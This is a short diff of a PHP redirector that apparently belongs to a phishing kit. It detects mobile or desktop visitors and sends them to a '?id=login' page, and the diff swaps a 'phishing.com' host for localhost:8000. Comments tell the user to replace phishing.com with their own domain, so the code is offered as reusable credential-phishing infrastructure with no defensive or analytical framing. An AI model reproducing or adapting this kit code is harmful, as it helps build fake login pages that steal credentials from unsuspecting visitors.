@@ -20,13 +20,13 @@ else{
   {
     //if visitor of the page is mobile.
     //then show the mobile version.
-    header('Location: http://phishing.com/mobile/?id=login'); // just replace phishing.com with your domain.(mobile version)
+    header('Location: http://localhost:8000/?id=login'); // just replace phishing.com with your domain.(mobile version)
   }
   else
   {
     //if visitor of the page is mobile.
     //then show the desktop version.
-    header("Location: http://phishing.com/?id=login"); // same here. (desktop version)
+    header("Location: http://localhost:8000/?id=login"); // same here. (desktop version)
   }
 }
 ?>
